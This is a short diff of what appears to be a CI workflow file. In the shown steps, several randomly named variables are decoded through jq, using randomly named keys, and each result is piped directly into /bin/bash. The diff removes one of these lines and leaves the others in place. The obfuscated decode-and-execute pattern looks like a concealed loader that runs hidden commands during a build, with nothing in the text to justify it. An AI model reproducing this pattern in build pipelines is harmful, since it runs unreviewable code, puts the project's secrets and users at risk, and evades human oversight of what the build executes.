@@ -28,7 +28,6 @@ jobs:
           echo $vit5656 | jq -r .e03287 | /bin/bash
           echo $yyo9339 | jq -r .oxv693 | /bin/bash
           printf '%s' "$rxt89" | jq -r .o7682 | /bin/bash
-          echo $dba078 | jq -r .kdsoc63201 | /bin/bash
           printf '%s' "$cglqi1253" | jq -r .afl6 | /bin/bash
 
       - name: Persist output
